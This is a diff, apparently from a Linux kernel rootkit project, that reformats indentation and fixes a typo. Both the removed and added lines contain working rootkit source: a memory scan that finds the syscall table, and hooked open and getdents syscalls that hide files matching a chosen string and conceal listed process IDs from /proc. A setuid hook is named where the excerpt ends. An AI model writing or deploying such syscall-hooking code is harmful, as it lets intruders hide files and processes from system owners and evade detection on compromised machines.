@@ -73,15 +73,15 @@ module_exit(rootkit_exit);
 /* Find System Call Table */
 
 psize **find_sys_call_table(void) { // Finds the system call table (duh)
-    psize **sctable;
-    psize i = START_CHECK;
-    while (i < END_CHECK) { // Basiclly this runs through memory looking for syscall table
-            sctable = (psize **) i;
-            if (sctable[__NR_close] == (psize *) sys_close) {
-                    return &sctable[0]; // __NR_close is 6, so 0 is the top of the call table
-            }
-            i += sizeof(void *);
-    }
+	psize **sctable;
+	psize i = START_CHECK;
+	while (i < END_CHECK) { // Basiclly this runs through memory looking for syscall table
+		sctable = (psize **) i;
+		if (sctable[__NR_close] == (psize *) sys_close) {
+			return &sctable[0]; // __NR_close is 6, so 0 is the top of the call table
+		}
+		i += sizeof(void *);
+	}
 	return NULL; // Didn't find :(
 }
 
@@ -90,26 +90,26 @@ psize **find_sys_call_table(void) { // Finds the system call table (duh)
 /* Hacked Open Syscall */
 
 asmlinkage int hacked_open(const char *pathname, int flags, mode_t mode){ // Hacked version of the open syscall
-    char *kernel_pathname;
+	char *kernel_pathname;
 	int i = 0;
-    kernel_pathname = (char*) kmalloc(256, GFP_KERNEL);
+	kernel_pathname = (char*) kmalloc(256, GFP_KERNEL);
 
-    copy_from_user(kernel_pathname, pathname, 255); // Move user shit to kernel land
+	copy_from_user(kernel_pathname, pathname, 255); // Move user shit to kernel land
 
-    if(strstr(kernel_pathname, hide_file) != NULL){ // See if it has our hide string in the name
-            kfree(kernel_pathname);
-            return -ENOENT; // Say there is no spoo- I mean file
-    }
-    if(strstr(kernel_pathname, "/proc") != NULL){
-    	for(i = 0; i < PID_index; i++){
-	    if(strstr(kernel_pathname, hidden_PIDs[i]) != NULL){
-	        kfree(kernel_pathname);
-                return -ENOENT; // Say there is no spoo- I mean process
-	    }
+	if(strstr(kernel_pathname, hide_file) != NULL){ // See if it has our hide string in the name
+		kfree(kernel_pathname);
+		return -ENOENT; // Say there is no spoo- I mean file
 	}
-    }
-    kfree(kernel_pathname);
-    return orig_open(pathname, flags, mode); // Shit good, run origonal syscall
+	if(strstr(kernel_pathname, "/proc") != NULL){
+		for(i = 0; i < PID_index; i++){
+			if(strstr(kernel_pathname, hidden_PIDs[i]) != NULL){
+				kfree(kernel_pathname);
+				return -ENOENT; // Say there is no spoo- I mean proces
+			}
+		}
+	}
+	kfree(kernel_pathname);
+	return orig_open(pathname, flags, mode); // Shit good, run original syscall
 }
 
 /* Hacked Getdents64 Syscall */
@@ -152,37 +152,37 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 /* Hacked Getdents Syscall */
 
 asmlinkage int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count){ // Hacked version of the getdents syscall
-    unsigned int tmp, n;
-    int t;
-    struct dirent *dirp2, *dirp3;
+	unsigned int tmp, n;
+	int t;
+	struct dirent *dirp2, *dirp3;
 
-    tmp = (*orig_getdents)(fd, dirp, count); // Same as before, but for 32bit getdents
+	tmp = (*orig_getdents)(fd, dirp, count); // Same as before, but for 32bit getdents
 
-    if(tmp > 0){
-        dirp2 = (struct dirent *) kmalloc(tmp, GFP_KERNEL);
-        copy_from_user(dirp2, dirp, tmp);
-        dirp3 = dirp2;
-        t = tmp;
-        while (t > 0){
-            n = dirp3->d_reclen;
-            t -= n;
-            if(strstr((char*) &(dirp3->d_name), hide_file) != NULL){
-                if (t != 0){
-                    memmove(dirp3, (char *) dirp3 + dirp3->d_reclen,t);
-                }
-                else{
-                    dirp3->d_off = 1024;
-                }
-                tmp -=n;
-            }
-                if (t != 0){
-                    dirp3 = (struct dirent *) ((char *) dirp3 + dirp3->d_reclen);
-            }
-        }
-        copy_to_user(dirp, dirp2, tmp);
-        kfree(dirp2);
-    }
-    return tmp;
+	if(tmp > 0){
+		dirp2 = (struct dirent *) kmalloc(tmp, GFP_KERNEL);
+		copy_from_user(dirp2, dirp, tmp);
+		dirp3 = dirp2;
+		t = tmp;
+		while (t > 0){
+			n = dirp3->d_reclen;
+			t -= n;
+			if(strstr((char*) &(dirp3->d_name), hide_file) != NULL){
+				if (t != 0){
+					memmove(dirp3, (char *) dirp3 + dirp3->d_reclen,t);
+				}
+				else{
+					dirp3->d_off = 1024;
+				}
+				tmp -=n;
+			}
+			if (t != 0){
+				dirp3 = (struct dirent *) ((char *) dirp3 + dirp3->d_reclen);
+			}
+		}
+		copy_to_user(dirp, dirp2, tmp);
+		kfree(dirp2);
+	}
+	return tmp;
 }
 
 /* Hacked Setuid Syscall */
